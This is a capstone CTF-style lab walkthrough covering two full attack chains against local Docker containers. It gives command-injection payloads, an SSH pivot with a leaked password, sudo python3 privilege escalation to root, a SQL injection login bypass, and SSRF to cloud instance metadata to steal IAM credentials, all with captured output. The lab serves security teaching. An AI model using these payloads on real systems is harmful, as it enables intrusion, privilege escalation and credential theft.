# Capstone — Full Attack Chain Walkthrough (Day 20)

## Authorized use only

Same notice as `README.md`: only run these commands against the containers this lab
starts. Every command below runs from `attacker` (started by `labs/base`) unless noted
otherwise.

## A note on how this was verified

Both paths below were run live, end-to-end, against a real `docker compose up` of this
exact `docker-compose.yml` (verified from a throwaway Alpine container on the `cyberlab`
network standing in for `attacker`, plus one direct `docker exec` into `webapp` to
confirm the SSH+sudo escalation mechanics before wiring them through the HTTP layer).
Every command, output, and flag string below is the actual captured output, not a
prediction. `docker compose config -q` was also run and passes.

## Setup

```sh
cd cyber_security/labs/base && ./up.sh        # if not already running
cd ../capstone && ./setup.sh                  # Docker only
```

Confirm the target is up:

```sh
cd ../base
docker compose exec attacker sh -c "curl -s webapp:5000/ ; echo"
```

**Expected:**

```
<h1>Northwind Ops Portal</h1><p>Routes: POST /register, GET/POST /login, GET /logout, GET /admin/diagnostics, GET /admin/fetch, GET /api/whoami</p>
```

This is Stage 1 (recon) in full — the target hands you its own route map, same pattern
as Day 4's target. The real work starts at Stage 2.

---

## Path A — Broken access control → command injection → pivot → host root

### Stage 2a — Register, then reach an endpoint that should require admin

```sh
docker compose exec attacker sh -c "
curl -s -c /tmp/a.txt -b /tmp/a.txt -X POST webapp:5000/register -d 'username=attacker&password=attacker123'
echo
curl -s -c /tmp/a.txt -b /tmp/a.txt -X POST webapp:5000/login -d 'username=attacker&password=attacker123'
echo
curl -s -b /tmp/a.txt webapp:5000/api/whoami
echo
"
```

**Expected:**

```
{"role":"user","status":"registered","username":"attacker"}
{"role":"user","status":"logged in","username":"attacker"}
{"role":"user","user":"attacker"}
```

You are a plain `user`, not `admin`. Now hit the endpoint that's supposed to require
admin:

```sh
docker compose exec attacker sh -c "curl -s -b /tmp/a.txt 'webapp:5000/admin/diagnostics?host=127.0.0.1'; echo"
```

**Expected:** a normal ping response, HTTP 200 — no 401/403 at all. **This is Finding
CAP-1**: `/admin/diagnostics` only checks `"user" in session`, never `session["role"] ==
"admin"` (see `webapp/app.py`'s `diagnostics()`). A plain, freely self-registered
account already reaches an endpoint that should be admin-only.

### Stage 2b — Command injection on that same endpoint

`/admin/diagnostics` builds `subprocess.getoutput(f"ping -c 1 -W 2 {host}")` — the
`host` parameter is spliced directly into a shell string. Chain a second command after
a `;`:

```sh
docker compose exec attacker sh -c "
curl -s -b /tmp/a.txt -G 'webapp:5000/admin/diagnostics' \
  --data-urlencode 'host=127.0.0.1; cat /opt/webapp/.internal/ops-notes.txt'
echo
"
```

**Expected (captured, real output):**

```
<pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.015 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.015/0.015/0.015/0.000 ms
Internal ops backend: ssh opsuser@host
Temporary password (rotate before Friday -- JIRA-4521): Fall2024-Temp!</pre>
```

**Finding CAP-2** (the command injection itself) and **Finding CAP-3** (the leaked
credential it exposed) in one request. The ping output is real, harmless noise; the
last two lines are the payoff — a leftover internal note naming `host`'s SSH
credential in plain text.

### Stage 3 — Lateral movement: pivot to `host` through webapp's own shell

`attacker` has no network route to `host` at all (see `docker-compose.yml` — `host` is
only on the lab-private `internal` network). The only way to reach it is to make
`webapp` do the connecting *for you*, by chaining an `ssh` call inside the same
command-injection primitive:

```sh
docker compose exec attacker sh -c "
curl -s -b /tmp/a.txt -G 'webapp:5000/admin/diagnostics' \
  --data-urlencode 'host=127.0.0.1; sshpass -p \"Fall2024-Temp!\" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null opsuser@host \"id\"'
echo
"
```

**Expected (real output):**

```
<pre>PING 127.0.0.1 ...
Warning: Permanently added 'host' (ED25519) to the list of known hosts.
uid=1000(opsuser) gid=1000(opsuser) groups=1000(opsuser)</pre>
```

That `uid=1000(opsuser)` line is running on `host`, not `webapp` — this single request
just pivoted across a network boundary `attacker` itself can never cross directly. This
is lateral movement in the most literal sense: riding an already-compromised host's own
network position and tools, not opening a new connection of your own.

### Stage 3 — Host privilege escalation: passwordless sudo on `python3`

On `host`, `opsuser` has a GTFOBins-documented escalation path
(https://gtfobins.github.io/gtfobins/python/): passwordless `sudo` on the entire
Python interpreter.

```sh
docker compose exec attacker sh -c "
curl -s -b /tmp/a.txt -G 'webapp:5000/admin/diagnostics' \
  --data-urlencode 'host=127.0.0.1; sshpass -p \"Fall2024-Temp!\" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null opsuser@host '\"'\"'sudo python3 -c \"import os; os.system(\\\"cat /root/flag_host_root.txt\\\")\"'\"'\"''
echo
"
```

**Expected (real output, captured):**

```
<pre>PING 127.0.0.1 ...
Warning: Permanently added 'host' (ED25519) to the list of known hosts.
CTF{host-root-via-sudo-python3-gtfobins}</pre>
```

**Finding CAP-4**: `opsuser` reads a root-only file (`chmod 600`) by handing `sudo`'s
already-root `python3` process a one-line `os.system()` call — the sudo rule doesn't
restrict *what* `python3` is allowed to do once invoked, only *that* it can be invoked
at all with no password. Full root, via `id` if you prefer a shell-shaped proof instead
of just the flag:

```sh
docker compose exec attacker sh -c "
curl -s -b /tmp/a.txt -G 'webapp:5000/admin/diagnostics' \
  --data-urlencode 'host=127.0.0.1; sshpass -p \"Fall2024-Temp!\" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null opsuser@host '\"'\"'sudo python3 -c \"import os; os.system(\\\"id\\\")\"'\"'\"''
echo
"
```

**Expected:** `uid=0(root) gid=0(root) groups=0(root)` on the last line.

*Escaping note, named honestly rather than glossed over:* the quoting above is genuinely
four shell layers deep (your local shell invoking `docker compose exec`, the `sh -c`
inside it, curl's URL-encoded query value, and finally `webapp`'s own
`subprocess.getoutput` shell, which itself launches `ssh` whose remote command is a
*fifth* shell on `host`). If you're constructing this by hand rather than copy-pasting,
build the payload in a local file first (`printf '...' > payload.txt`) and pass it with
`curl -G --data-urlencode host@payload.txt` — this sidesteps needing to escape anything
for your *own* invoking shell, since curl reads the raw bytes from the file. That is
exactly how this solution file's commands were actually captured.

---

## Path B — SQL injection → admin → SSRF → cloud credential theft

### Stage 2c — SQL injection auth bypass on `/login`

`webapp/app.py`'s `login()` builds `f"SELECT username, role FROM users WHERE
username='{username}' AND password='{password}'"` — a raw string, not a parameterized
query. A username of `admin' -- ` comments out the rest of the query (including the
password check) in SQLite:

```sh
docker compose exec attacker sh -c "
curl -s -c /tmp/b.txt -b /tmp/b.txt -X POST webapp:5000/login \
  --data-urlencode \"username=admin' -- \" --data-urlencode 'password=anything'
echo
curl -s -b /tmp/b.txt webapp:5000/api/whoami
echo
"
```

**Expected (real output):**

```
{"role":"admin","status":"logged in","username":"admin"}
{"role":"admin","user":"admin"}
```

**Finding CAP-5.** No password guessing, no brute force, no knowledge of the real
(randomly-generated-at-startup, never-exposed) admin password at all — the injection
bypasses the password check entirely.

### Stage 4 — SSRF to instance metadata

`/admin/fetch` correctly checks `session["role"] == "admin"` (not a bug) but performs
`requests.get(url)` with no allowlist and no block on link-local addresses (the actual
bug — SSRF). With the admin session from Stage 2c:

```sh
docker compose exec attacker sh -c "
curl -s -b /tmp/b.txt -G 'webapp:5000/admin/fetch' \
  --data-urlencode 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
echo
"
```

**Expected:** `lab-capstone-role`

```sh
docker compose exec attacker sh -c "
curl -s -b /tmp/b.txt -G 'webapp:5000/admin/fetch' \
  --data-urlencode 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/lab-capstone-role'
echo
"
```

**Expected (real output):**

```json
{"AccessKeyId":"AKIA_FAKE_CAPSTONE_LAB01","Code":"Success","Expiration":"2099-01-01T00:00:00Z","LastUpdated":"2026-01-01T00:00:00Z","SecretAccessKey":"FAKEfakeSecretForLabPurposesOnly1234567890","Token":"FAKE-SESSION-TOKEN-CAPSTONE","Type":"AWS-HMAC"}
```

**Finding CAP-6** (the SSRF itself) and **Finding CAP-7** (IMDSv1 serves this with zero
authentication) — `attacker` itself can never reach `169.254.169.254` directly (it has
no route to the `imds` network at all); `webapp`'s SSRF just fetched it on the
attacker's behalf. Note that this path never touched `host` or Path A's bugs at all —
it is a fully independent route to a fully independent objective.

### Stage 4 — Use the stolen credentials directly against the cloud resource

Once you *hold* credentials, using them looks exactly like using real stolen AWS
credentials — no further SSRF, no further pivot, straight from `attacker`:

```sh
docker compose exec attacker sh -c "
curl -s -H 'X-Amz-Access-Key-Id: AKIA_FAKE_CAPSTONE_LAB01' \
  'fake-s3:8080/fake-s3/lab-capstone-bucket/confidential/findings.txt'
echo
"
```

**Expected (real output):**

```
Q3 internal pentest findings -- CONFIDENTIAL, DO NOT DISTRIBUTE
CTF{capstone-cloud-creds-stolen-via-ssrf-imdsv1}
```

Confirm the credential actually matters (not just reachability):

```sh
docker compose exec attacker sh -c "
curl -s -o /dev/null -w '%{http_code}\n' \
  'fake-s3:8080/fake-s3/lab-capstone-bucket/confidential/findings.txt'
"
```

**Expected:** `403` — without the header, `fake-s3` refuses the exact same request.

---

## Lab verify (matches the plan's Task 26 verify command)

```sh
cd cyber_security/labs/capstone
docker compose config -q && bash setup.sh --check
```

**Expected:** `COMPOSE_OK`-equivalent (compose config prints nothing on success with
`-q`) followed by `CAPSTONE_CHECK_OK`. This is a dry-validation check (no docker/aws API
calls); the full attack chain above is what actually reproduces the chain, captured
live above.

## Summary — what each stage proves, for `report-template.md` Section 6

| Stage | Vector | Result |
|---|---|---|
| Recon | route enumeration | full route map, zero guessing |
| 2a | broken access control | `user` account reaches an admin-only endpoint |
| 2b | OS command injection | arbitrary command execution as `webapp`'s app user |
| 2 (leak) | hardcoded/leaked credential | `host`'s SSH password, in plaintext |
| 3 | lateral movement / pivot | `attacker` → `webapp` → `host`, a network `attacker` never had a route to |
| 3 | privilege escalation (GTFOBins) | `opsuser` → `root` on `host` via `sudo python3` |
| 2c | SQL injection | authentication bypass to `admin`, no password needed |
| 4 | SSRF | `webapp` fetches `169.254.169.254` on the attacker's behalf |
| 4 | IMDSv1 / credential theft | fake IAM role credentials, no token required |
| 4 | credential use | `fake-s3` object read directly, no further pivot |
